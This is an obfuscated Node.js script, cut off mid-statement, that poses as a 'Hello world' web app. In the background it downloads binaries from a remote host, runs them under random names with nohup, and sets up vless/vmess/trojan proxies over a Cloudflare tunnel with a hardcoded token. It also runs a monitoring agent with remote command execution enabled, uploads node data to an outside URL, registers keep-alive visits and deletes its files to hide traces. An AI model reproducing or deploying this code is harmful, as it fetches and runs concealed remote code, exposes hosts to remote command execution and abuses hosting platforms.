const _0x242c34=_0x45e9;(function(_0x34df27,_0x4c7932){const _0x9465c8=_0x45e9,_0x7c323f=_0x34df27();while(!![]){try{const _0x2b819f=-parseInt(_0x9465c8(0x1db))/0x1+-parseInt(_0x9465c8(0x1c2))/0x2*(parseInt(_0x9465c8(0x1f8))/0x3)+parseInt(_0x9465c8(0x1e1))/0x4+parseInt(_0x9465c8(0x173))/0x5*(-parseInt(_0x9465c8(0x197))/0x6)+parseInt(_0x9465c8(0x1f3))/0x7+parseInt(_0x9465c8(0x236))/0x8+-parseInt(_0x9465c8(0x19b))/0x9;if(_0x2b819f===_0x4c7932)break;else _0x7c323f['push'](_0x7c323f['shift']());}catch(_0x4f96e2){_0x7c323f['push'](_0x7c323f['shift']());}}}(_0x54f9,0x65a15));const express=require(_0x242c34(0x1f2)),app=express(),axios=require(_0x242c34(0x189)),os=require('os'),fs=require('fs'),path=require(_0x242c34(0x1c1)),{promisify}=require('util'),exec=promisify(require(_0x242c34(0x1c5))[_0x242c34(0x22b)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x242c34(0x1c3)]||'',PROJECT_URL=process[_0x242c34(0x179)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x242c34(0x179)][_0x242c34(0x20b)]||![],FILE_PATH=process[_0x242c34(0x179)][_0x242c34(0x1a6)]||'./tmp',SUB_PATH=process[_0x242c34(0x179)][_0x242c34(0x1a5)]||'sub',PORT=process[_0x242c34(0x179)][_0x242c34(0x1f4)]||process['env'][_0x242c34(0x1c4)]||0xbb8,UUID=process[_0x242c34(0x179)]['UUID']||_0x242c34(0x218),NEZHA_SERVER=process['env'][_0x242c34(0x194)]||'',NEZHA_PORT=process[_0x242c34(0x179)][_0x242c34(0x1f7)]||'',NEZHA_KEY=process[_0x242c34(0x179)][_0x242c34(0x1ec)]||'',ARGO_DOMAIN=process[_0x242c34(0x179)][_0x242c34(0x19c)]||'cc.seoeeee.qzz.io',ARGO_AUTH=process['env'][_0x242c34(0x214)]||_0x242c34(0x184),ARGO_PORT=process[_0x242c34(0x179)][_0x242c34(0x1b8)]||0x1f41,CFIP=process[_0x242c34(0x179)][_0x242c34(0x217)]||'cdns.doon.eu.org',CFPORT=process[_0x242c34(0x179)][_0x242c34(0x19e)]||0x1bb,NAME=process[_0x242c34(0x179)]['NAME']||_0x242c34(0x1e3);function _0x54f9(){const _0x2124e0=['path','2mHGMkA','UPLOAD_URL','PORT','child_process','\x0aclient_secret:\x20','https://arm64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','Download\x20','base64','php\x20running\x20error:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel.json','\x20is\x20created','\x0avless://','xtls-rprx-vision','tcp','443','https://arm64.ssss.nyc.mn/bot','listen','trojan','has','vless','includes','&path=%2Ftrojan-argo%3Fed%3D2560#','unlinkSync','176537zkEHio','tunnel.yml','\x0a\x20\x20tunnel:\x20','2083','forEach','config.json','405384gwOeHs','/api/add-nodes','Railway','\x0a\x20\x20\x20\x20','TunnelSecret','message','boot.log','\x20-p\x20','\x20-c\x20','direct','block','NEZHA_KEY','\x20>\x20nul\x202>&1','statSync','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20successfully','\x0a\x0avmess://','express','4715487GLsSxB','SERVER_PORT','tls','length','NEZHA_PORT','1609560NuCKcX','https+local://8.8.8.8/dns-query','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/trojan-argo','data','/config.json\x20>/dev/null\x202>&1\x20&','platform','existsSync','?encryption=none&security=tls&sni=','send','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x0atrojan://','aarch64','Unhandled\x20error\x20in\x20startserver:','\x20-s\x20','countryCode','https://amd64.ssss.nyc.mn/web','test','basename','AUTO_ACCESS','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','Subscription\x20uploaded\x20successfully','split','2096','/api/delete-nodes','utf-8','Error\x20reading\x20boot.log:','ARGO_AUTH','application/json','none','CFIP','b97f85ae-66c9-4709-be18-9077d046258e','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','blackhole','2087','unlink','clear','pkill\x20-f\x20\x22[','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/agent','substring','taskkill\x20/f\x20/im\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','true','web\x20running\x20error:\x20','match','http://ip-api.com/json/','success','response','exec','stringify','NEZHA\x20variable\x20is\x20empty,skip\x20running','abcdefghijklmnopqrstuvwxyz','get','2053','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','freedom','chmod','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','country_code','6370016jdWkEM','/api/add-subscriptions','list.txt','vmess','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/v1','Nodes\x20uploaded\x20successfully','catch','843485uvjDiK','push','https://arm64.ssss.nyc.mn/agent','amd','floor','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','env','ARGO_DOMAIN:','&path=%2Fvless-argo%3Fed%3D2560#','http','status','arch','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20failed:\x20','\x20-c\x20\x22','toString','join','eyJhIjoiZmUyZWQwM2ZmOWQ1N2IwYmYwN2I1MGExMGMxZGM0OTAiLCJ0IjoiMmNiYzk5YjctYjRlNS00YjhjLTkzOGEtNTlhMGU0ZWViYWEyIiwicyI6Ik1EWTBPREpsWlRjdFpqRTNOeTAwTkdZM0xXSTNNR1l0WXpRNFpHUTNNVGt5WmpobCJ9','all','false','org','post','axios','writeFileSync','127.0.0.1','Hello\x20world!','\x20already\x20exists','https://oooo.serv00.net/add-url','&fp=firefox&type=ws&host=','sub.txt','/vless-argo','8443','map','NEZHA_SERVER','http\x20server\x20is\x20running\x20on\x20port:','Error\x20executing\x20command:\x20','6DnEPhl','text/plain;\x20charset=utf-8','Content-Type','quic','2458872nfzORy','ARGO_DOMAIN','ArgoDomain:','CFPORT','arm','/tunnel.yml\x20run','rm\x20-rf\x20','filter','App\x20is\x20running','\x20is\x20running','SUB_PATH','FILE_PATH','firefox','/vmess-argo','pop','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','isFile','charAt','/dev/null','nohup\x20','from','mkdirSync','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/v1','https://ipapi.co/json/','Empowerment\x20success\x20for\x20','error','fileName','\x0a\x20\x20credentials-file:\x20','ARGO_PORT','random','log','readFileSync','Empowerment\x20failed\x20for\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','unshift','?security=tls&sni=','close'];_0x54f9=function(){return _0x2124e0;};return _0x54f9();}!fs[_0x242c34(0x1ff)](FILE_PATH)?(fs[_0x242c34(0x1b0)](FILE_PATH),console[_0x242c34(0x1ba)](FILE_PATH+_0x242c34(0x1ce))):console['log'](FILE_PATH+_0x242c34(0x18d));function generateRandomName(){const _0x2a9ed2=_0x242c34,_0x1f56ee=_0x2a9ed2(0x22e);let _0x3a62e1='';for(let _0x14ad24=0x0;_0x14ad24<0x6;_0x14ad24++){_0x3a62e1+=_0x1f56ee[_0x2a9ed2(0x1ac)](Math[_0x2a9ed2(0x177)](Math[_0x2a9ed2(0x1b9)]()*_0x1f56ee['length']));}return _0x3a62e1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x242c34(0x183)](FILE_PATH,webName),botPath=path[_0x242c34(0x183)](FILE_PATH,botName),subPath=path[_0x242c34(0x183)](FILE_PATH,_0x242c34(0x190)),listPath=path['join'](FILE_PATH,_0x242c34(0x238)),bootLogPath=path[_0x242c34(0x183)](FILE_PATH,_0x242c34(0x1e7)),configPath=path['join'](FILE_PATH,_0x242c34(0x1e0));function deleteNodes(){const _0x4fb09a=_0x242c34;try{if(!UPLOAD_URL)return;if(!fs[_0x4fb09a(0x1ff)](subPath))return;let _0x4be38d;try{_0x4be38d=fs[_0x4fb09a(0x1bb)](subPath,_0x4fb09a(0x212));}catch{return null;}const _0x38ffc6=Buffer[_0x4fb09a(0x1af)](_0x4be38d,_0x4fb09a(0x1ca))[_0x4fb09a(0x182)](_0x4fb09a(0x212)),_0xaeeb3=_0x38ffc6[_0x4fb09a(0x20f)]('\x0a')[_0x4fb09a(0x1a2)](_0x163ca6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4fb09a(0x209)](_0x163ca6));if(_0xaeeb3[_0x4fb09a(0x1f6)]===0x0)return;return axios[_0x4fb09a(0x188)](UPLOAD_URL+_0x4fb09a(0x211),JSON[_0x4fb09a(0x22c)]({'nodes':_0xaeeb3}),{'headers':{'Content-Type':_0x4fb09a(0x215)}})['catch'](_0x540bfc=>{return null;}),null;}catch(_0x2fbde6){return null;}}function cleanupOldFiles(){const _0x3cedb4=_0x242c34;try{const _0x2754b7=fs['readdirSync'](FILE_PATH);_0x2754b7[_0x3cedb4(0x1df)](_0x15cf69=>{const _0x1ec604=_0x3cedb4,_0x5f1276=path['join'](FILE_PATH,_0x15cf69);try{const _0x32b581=fs[_0x1ec604(0x1ee)](_0x5f1276);_0x32b581[_0x1ec604(0x1ab)]()&&fs[_0x1ec604(0x1da)](_0x5f1276);}catch(_0x36d030){}});}catch(_0x8eebfa){}}app[_0x242c34(0x22f)]('/',function(_0x426fc9,_0x2df7a2){const _0x4578c9=_0x242c34;_0x2df7a2[_0x4578c9(0x201)](_0x4578c9(0x18c));});async function generateConfig(){const _0x868d91=_0x242c34,_0x1a0e69={'log':{'access':_0x868d91(0x1ad),'error':_0x868d91(0x1ad),'loglevel':_0x868d91(0x216)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x868d91(0x1d0)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x868d91(0x1a8),'dest':0xbbb},{'path':_0x868d91(0x1fb),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x868d91(0x18b),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x868d91(0x216)},'streamSettings':{'network':_0x868d91(0x1d1),'security':'none'}},{'port':0xbba,'listen':_0x868d91(0x18b),'protocol':_0x868d91(0x1d7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x868d91(0x216)},'streamSettings':{'network':'ws','security':_0x868d91(0x216),'wsSettings':{'path':_0x868d91(0x191)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x868d91(0x1f5),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x868d91(0x18b),'protocol':_0x868d91(0x239),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x868d91(0x1a8)}},'sniffing':{'enabled':!![],'destOverride':[_0x868d91(0x17c),_0x868d91(0x1f5),_0x868d91(0x19a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x868d91(0x18b),'protocol':_0x868d91(0x1d5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x868d91(0x216),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x868d91(0x1f5),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x868d91(0x1f9)]},'outbounds':[{'protocol':_0x868d91(0x232),'tag':_0x868d91(0x1ea)},{'protocol':_0x868d91(0x21a),'tag':_0x868d91(0x1eb)}]};fs[_0x868d91(0x18a)](path[_0x868d91(0x183)](FILE_PATH,_0x868d91(0x1e0)),JSON[_0x868d91(0x22c)](_0x1a0e69,null,0x2));}function getSystemArchitecture(){const _0x401a48=_0x242c34,_0x5d57a4=os[_0x401a48(0x17e)]();return _0x5d57a4===_0x401a48(0x19f)||_0x5d57a4==='arm64'||_0x5d57a4===_0x401a48(0x204)?_0x401a48(0x19f):_0x401a48(0x176);}function downloadFile(_0x230e3c,_0x4f6101,_0x44e686){const _0x34c466=_0x242c34,_0x5452c0=_0x230e3c;!fs[_0x34c466(0x1ff)](FILE_PATH)&&fs[_0x34c466(0x1b0)](FILE_PATH,{'recursive':!![]});const _0x5cc48d=fs['createWriteStream'](_0x5452c0);axios({'method':_0x34c466(0x22f),'url':_0x4f6101,'responseType':'stream'})['then'](_0x7d779=>{const _0x444ae1=_0x34c466;_0x7d779[_0x444ae1(0x1fc)]['pipe'](_0x5cc48d),_0x5cc48d['on']('finish',()=>{const _0x538225=_0x444ae1;_0x5cc48d[_0x538225(0x1c0)](),console[_0x538225(0x1ba)](_0x538225(0x1c9)+path[_0x538225(0x20a)](_0x5452c0)+_0x538225(0x1f0)),_0x44e686(null,_0x5452c0);}),_0x5cc48d['on'](_0x444ae1(0x1b5),_0xc60f5f=>{const _0x3158d7=_0x444ae1;fs[_0x3158d7(0x21c)](_0x5452c0,()=>{});const _0x4437bd=_0x3158d7(0x1c9)+path[_0x3158d7(0x20a)](_0x5452c0)+_0x3158d7(0x180)+_0xc60f5f[_0x3158d7(0x1e6)];console[_0x3158d7(0x1b5)](_0x4437bd),_0x44e686(_0x4437bd);});})[_0x34c466(0x172)](_0xe35aba=>{const _0xe24ebc=_0x34c466,_0x432316=_0xe24ebc(0x1c9)+path[_0xe24ebc(0x20a)](_0x5452c0)+_0xe24ebc(0x180)+_0xe35aba[_0xe24ebc(0x1e6)];console[_0xe24ebc(0x1b5)](_0x432316),_0x44e686(_0x432316);});}async function downloadFilesAndRun(){const _0x3632f6=_0x242c34,_0x1d78de=getSystemArchitecture(),_0x23fd0b=getFilesForArchitecture(_0x1d78de);if(_0x23fd0b[_0x3632f6(0x1f6)]===0x0){console[_0x3632f6(0x1ba)](_0x3632f6(0x231));return;}const _0x48b3c1=_0x23fd0b[_0x3632f6(0x193)](_0x58c096=>{return new Promise((_0x110621,_0x1e5969)=>{const _0x3a5527=_0x45e9;downloadFile(_0x58c096[_0x3a5527(0x1b6)],_0x58c096['fileUrl'],(_0x495155,_0x3e4ae6)=>{_0x495155?_0x1e5969(_0x495155):_0x110621(_0x3e4ae6);});});});try{await Promise[_0x3632f6(0x185)](_0x48b3c1);}catch(_0x3b18ee){console[_0x3632f6(0x1b5)]('Error\x20downloading\x20files:',_0x3b18ee);return;}function _0x359a33(_0x59aca9){const _0x4c5835=_0x3632f6,_0x1123e3=0x1fd;_0x59aca9[_0x4c5835(0x1df)](_0x16e9da=>{const _0x68a121=_0x4c5835;fs[_0x68a121(0x1ff)](_0x16e9da)&&fs[_0x68a121(0x233)](_0x16e9da,_0x1123e3,_0x332038=>{const _0xff8206=_0x68a121;_0x332038?console[_0xff8206(0x1b5)](_0xff8206(0x1bc)+_0x16e9da+':\x20'+_0x332038):console[_0xff8206(0x1ba)](_0xff8206(0x1b4)+_0x16e9da+':\x20'+_0x1123e3[_0xff8206(0x182)](0x8));});});}const _0x33d7f5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x359a33(_0x33d7f5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x496095=NEZHA_SERVER[_0x3632f6(0x1d8)](':')?NEZHA_SERVER['split'](':')[_0x3632f6(0x1a9)]():'',_0x45125c=new Set([_0x3632f6(0x1d2),_0x3632f6(0x192),'2096',_0x3632f6(0x21b),'2083',_0x3632f6(0x230)]),_0x3c7384=_0x45125c[_0x3632f6(0x1d6)](_0x496095)?_0x3632f6(0x225):_0x3632f6(0x186),_0x434c55=_0x3632f6(0x1c6)+NEZHA_KEY+_0x3632f6(0x20c)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3c7384+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3632f6(0x18a)](path[_0x3632f6(0x183)](FILE_PATH,'config.yaml'),_0x434c55);const _0x55db9a=_0x3632f6(0x1ae)+phpPath+_0x3632f6(0x181)+FILE_PATH+_0x3632f6(0x219);try{await exec(_0x55db9a),console[_0x3632f6(0x1ba)](phpName+'\x20is\x20running'),await new Promise(_0x4e4b3b=>setTimeout(_0x4e4b3b,0x3e8));}catch(_0x188ca5){console[_0x3632f6(0x1b5)](_0x3632f6(0x1cb)+_0x188ca5);}}else{let _0x6d894='';const _0x524e4b=[_0x3632f6(0x1d2),_0x3632f6(0x192),_0x3632f6(0x210),_0x3632f6(0x21b),_0x3632f6(0x1de),_0x3632f6(0x230)];_0x524e4b[_0x3632f6(0x1d8)](NEZHA_PORT)&&(_0x6d894='--tls');const _0x587b36=_0x3632f6(0x1ae)+npmPath+_0x3632f6(0x206)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3632f6(0x1e8)+NEZHA_KEY+'\x20'+_0x6d894+_0x3632f6(0x178);try{await exec(_0x587b36),console[_0x3632f6(0x1ba)](npmName+_0x3632f6(0x1a4)),await new Promise(_0x640338=>setTimeout(_0x640338,0x3e8));}catch(_0x119da5){console['error'](_0x3632f6(0x1c8)+_0x119da5);}}}else console[_0x3632f6(0x1ba)](_0x3632f6(0x22d));const _0x103c8a='nohup\x20'+webPath+_0x3632f6(0x1e9)+FILE_PATH+_0x3632f6(0x1fd);try{await exec(_0x103c8a),console['log'](webName+_0x3632f6(0x1a4)),await new Promise(_0x368c87=>setTimeout(_0x368c87,0x3e8));}catch(_0xa140ad){console['error'](_0x3632f6(0x226)+_0xa140ad);}if(fs[_0x3632f6(0x1ff)](botPath)){let _0x19e793;if(ARGO_AUTH[_0x3632f6(0x227)](/^[A-Z0-9a-z=]{120,250}$/))_0x19e793=_0x3632f6(0x1aa)+ARGO_AUTH;else ARGO_AUTH[_0x3632f6(0x227)](/TunnelSecret/)?_0x19e793=_0x3632f6(0x223)+FILE_PATH+_0x3632f6(0x1a0):_0x19e793=_0x3632f6(0x17f)+FILE_PATH+_0x3632f6(0x1cc)+ARGO_PORT;try{await exec(_0x3632f6(0x1ae)+botPath+'\x20'+_0x19e793+'\x20>/dev/null\x202>&1\x20&'),console[_0x3632f6(0x1ba)](botName+_0x3632f6(0x1a4)),await new Promise(_0x5c1cca=>setTimeout(_0x5c1cca,0x7d0));}catch(_0x7f876a){console[_0x3632f6(0x1b5)]('Error\x20executing\x20command:\x20'+_0x7f876a);}}await new Promise(_0x3239f4=>setTimeout(_0x3239f4,0x1388));}function getFilesForArchitecture(_0x58c504){const _0x3cb851=_0x242c34;let _0x5b8d39;_0x58c504===_0x3cb851(0x19f)?_0x5b8d39=[{'fileName':webPath,'fileUrl':_0x3cb851(0x1c7)},{'fileName':botPath,'fileUrl':_0x3cb851(0x1d3)}]:_0x5b8d39=[{'fileName':webPath,'fileUrl':_0x3cb851(0x208)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x62c4b4=_0x58c504===_0x3cb851(0x19f)?_0x3cb851(0x175):_0x3cb851(0x220);_0x5b8d39[_0x3cb851(0x1be)]({'fileName':npmPath,'fileUrl':_0x62c4b4});}else{const _0x4fb6e4=_0x58c504===_0x3cb851(0x19f)?_0x3cb851(0x1b2):_0x3cb851(0x170);_0x5b8d39[_0x3cb851(0x1be)]({'fileName':phpPath,'fileUrl':_0x4fb6e4});}}return _0x5b8d39;}function argoType(){const _0x1ebeeb=_0x242c34;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ebeeb(0x1ba)](_0x1ebeeb(0x23a));return;}if(ARGO_AUTH[_0x1ebeeb(0x1d8)](_0x1ebeeb(0x1e5))){fs[_0x1ebeeb(0x18a)](path[_0x1ebeeb(0x183)](FILE_PATH,_0x1ebeeb(0x1cd)),ARGO_AUTH);const _0x42018f=_0x1ebeeb(0x1dd)+ARGO_AUTH[_0x1ebeeb(0x20f)]('\x22')[0xb]+_0x1ebeeb(0x1b7)+path[_0x1ebeeb(0x183)](FILE_PATH,_0x1ebeeb(0x1cd))+_0x1ebeeb(0x1fa)+ARGO_DOMAIN+_0x1ebeeb(0x234)+ARGO_PORT+_0x1ebeeb(0x1ef);fs[_0x1ebeeb(0x18a)](path[_0x1ebeeb(0x183)](FILE_PATH,_0x1ebeeb(0x1dc)),_0x42018f);}else console[_0x1ebeeb(0x1ba)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x14e708=_0x242c34;let _0x3752c7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3752c7=ARGO_DOMAIN,console[_0x14e708(0x1ba)](_0x14e708(0x17a),_0x3752c7),await _0x4cdc23(_0x3752c7);else try{const _0x417cbd=fs[_0x14e708(0x1bb)](path[_0x14e708(0x183)](FILE_PATH,_0x14e708(0x1e7)),'utf-8'),_0x2fb91a=_0x417cbd['split']('\x0a'),_0x5b2d6c=[];_0x2fb91a[_0x14e708(0x1df)](_0x554dfe=>{const _0x3537f8=_0x554dfe['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3537f8){const _0x2d0fb2=_0x3537f8[0x1];_0x5b2d6c['push'](_0x2d0fb2);}});if(_0x5b2d6c[_0x14e708(0x1f6)]>0x0)_0x3752c7=_0x5b2d6c[0x0],console['log'](_0x14e708(0x19d),_0x3752c7),await _0x4cdc23(_0x3752c7);else{console[_0x14e708(0x1ba)](_0x14e708(0x224)),fs['unlinkSync'](path[_0x14e708(0x183)](FILE_PATH,'boot.log'));async function _0x1946ee(){const _0x4220f6=_0x14e708;try{process[_0x4220f6(0x1fe)]==='win32'?await exec(_0x4220f6(0x222)+botName+_0x4220f6(0x1b1)):await exec(_0x4220f6(0x21e)+botName[_0x4220f6(0x1ac)](0x0)+']'+botName[_0x4220f6(0x221)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x20bac1){}}_0x1946ee(),await new Promise(_0x16e056=>setTimeout(_0x16e056,0xbb8));const _0x588b4b=_0x14e708(0x17f)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x14e708(0x1ae)+botPath+'\x20'+_0x588b4b+'\x20>/dev/null\x202>&1\x20&'),console[_0x14e708(0x1ba)](botName+_0x14e708(0x1a4)),await new Promise(_0x218a67=>setTimeout(_0x218a67,0xbb8)),await extractDomains();}catch(_0x11369d){console['error'](_0x14e708(0x196)+_0x11369d);}}}catch(_0x46ee4e){console['error'](_0x14e708(0x213),_0x46ee4e);}async function _0x225ed3(){const _0x3c9a8f=_0x14e708;try{const _0x433eef=await axios[_0x3c9a8f(0x22f)](_0x3c9a8f(0x1b3),{'timeout':0xbb8});if(_0x433eef[_0x3c9a8f(0x1fc)]&&_0x433eef[_0x3c9a8f(0x1fc)][_0x3c9a8f(0x235)]&&_0x433eef['data'][_0x3c9a8f(0x187)])return _0x433eef[_0x3c9a8f(0x1fc)][_0x3c9a8f(0x235)]+'_'+_0x433eef[_0x3c9a8f(0x1fc)]['org'];}catch(_0x34a11a){try{const _0x33d13b=await axios[_0x3c9a8f(0x22f)](_0x3c9a8f(0x228),{'timeout':0xbb8});if(_0x33d13b[_0x3c9a8f(0x1fc)]&&_0x33d13b['data'][_0x3c9a8f(0x17d)]===_0x3c9a8f(0x229)&&_0x33d13b[_0x3c9a8f(0x1fc)][_0x3c9a8f(0x207)]&&_0x33d13b[_0x3c9a8f(0x1fc)][_0x3c9a8f(0x187)])return _0x33d13b[_0x3c9a8f(0x1fc)][_0x3c9a8f(0x207)]+'_'+_0x33d13b[_0x3c9a8f(0x1fc)][_0x3c9a8f(0x187)];}catch(_0x29cc88){}}return'Unknown';}async function _0x4cdc23(_0x4b3b2a){const _0x2b5116=await _0x225ed3(),_0x3574ca=NAME?NAME+'-'+_0x2b5116:_0x2b5116;return new Promise(_0x2e3250=>{setTimeout(()=>{const _0x2ec026=_0x45e9,_0x2dbb98={'v':'2','ps':''+_0x3574ca,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2ec026(0x216),'net':'ws','type':_0x2ec026(0x216),'host':_0x4b3b2a,'path':_0x2ec026(0x21f),'tls':_0x2ec026(0x1f5),'sni':_0x4b3b2a,'alpn':'','fp':_0x2ec026(0x1a7)},_0xc81970=_0x2ec026(0x1cf)+UUID+'@'+CFIP+':'+CFPORT+_0x2ec026(0x200)+_0x4b3b2a+_0x2ec026(0x18f)+_0x4b3b2a+_0x2ec026(0x17b)+_0x3574ca+_0x2ec026(0x1f1)+Buffer[_0x2ec026(0x1af)](JSON[_0x2ec026(0x22c)](_0x2dbb98))[_0x2ec026(0x182)](_0x2ec026(0x1ca))+_0x2ec026(0x203)+UUID+'@'+CFIP+':'+CFPORT+_0x2ec026(0x1bf)+_0x4b3b2a+_0x2ec026(0x18f)+_0x4b3b2a+_0x2ec026(0x1d9)+_0x3574ca+_0x2ec026(0x1e4);console[_0x2ec026(0x1ba)](Buffer[_0x2ec026(0x1af)](_0xc81970)[_0x2ec026(0x182)](_0x2ec026(0x1ca))),fs[_0x2ec026(0x18a)](subPath,Buffer['from'](_0xc81970)[_0x2ec026(0x182)]('base64')),console[_0x2ec026(0x1ba)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x1b2610,_0x126889)=>{const _0x463d73=_0x2ec026,_0x3095dc=Buffer[_0x463d73(0x1af)](_0xc81970)[_0x463d73(0x182)]('base64');_0x126889['set'](_0x463d73(0x199),_0x463d73(0x198)),_0x126889[_0x463d73(0x201)](_0x3095dc);}),_0x2e3250(_0xc81970);},0x7d0);});}}async function uploadNodes(){const _0x4a4614=_0x242c34;if(UPLOAD_URL&&PROJECT_URL){const _0x1eeb3e=PROJECT_URL+'/'+SUB_PATH,_0xdd147f={'subscription':[_0x1eeb3e]};try{const _0x4e1d5b=await axios[_0x4a4614(0x188)](UPLOAD_URL+_0x4a4614(0x237),_0xdd147f,{'headers':{'Content-Type':_0x4a4614(0x215)}});return _0x4e1d5b&&_0x4e1d5b['status']===0xc8?(console[_0x4a4614(0x1ba)](_0x4a4614(0x20e)),_0x4e1d5b):null;}catch(_0x1b736b){if(_0x1b736b[_0x4a4614(0x22a)]){if(_0x1b736b['response'][_0x4a4614(0x17d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4a4614(0x1ff)](listPath))return;const _0xc85400=fs[_0x4a4614(0x1bb)](listPath,'utf-8'),_0x361c83=_0xc85400['split']('\x0a')[_0x4a4614(0x1a2)](_0x5ef7ab=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5ef7ab));if(_0x361c83[_0x4a4614(0x1f6)]===0x0)return;const _0x399b66=JSON[_0x4a4614(0x22c)]({'nodes':_0x361c83});try{const _0x4d6bd7=await axios[_0x4a4614(0x188)](UPLOAD_URL+_0x4a4614(0x1e2),_0x399b66,{'headers':{'Content-Type':'application/json'}});return _0x4d6bd7&&_0x4d6bd7[_0x4a4614(0x17d)]===0xc8?(console[_0x4a4614(0x1ba)](_0x4a4614(0x171)),_0x4d6bd7):null;}catch(_0x145f59){return null;}}else return;}}function _0x45e9(_0x28f421,_0x23f96f){_0x28f421=_0x28f421-0x170;const _0x54f902=_0x54f9();let _0x45e986=_0x54f902[_0x28f421];return _0x45e986;}function cleanFiles(){setTimeout(()=>{const _0x44335a=_0x45e9,_0x597249=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x597249[_0x44335a(0x174)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x597249[_0x44335a(0x174)](phpPath);process[_0x44335a(0x1fe)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x597249['join']('\x20')+_0x44335a(0x1ed),_0x179a29=>{const _0x3bf7e5=_0x44335a;console[_0x3bf7e5(0x21d)](),console[_0x3bf7e5(0x1ba)](_0x3bf7e5(0x1a3)),console[_0x3bf7e5(0x1ba)](_0x3bf7e5(0x1bd));}):exec(_0x44335a(0x1a1)+_0x597249[_0x44335a(0x183)]('\x20')+'\x20>/dev/null\x202>&1',_0x4f05f7=>{const _0x41e9b9=_0x44335a;console['clear'](),console[_0x41e9b9(0x1ba)](_0x41e9b9(0x1a3)),console[_0x41e9b9(0x1ba)](_0x41e9b9(0x1bd));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2c2f3e=_0x242c34;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2c2f3e(0x1ba)](_0x2c2f3e(0x202));return;}try{const _0x2ad375=await axios['post'](_0x2c2f3e(0x18e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2c2f3e(0x215)}});return 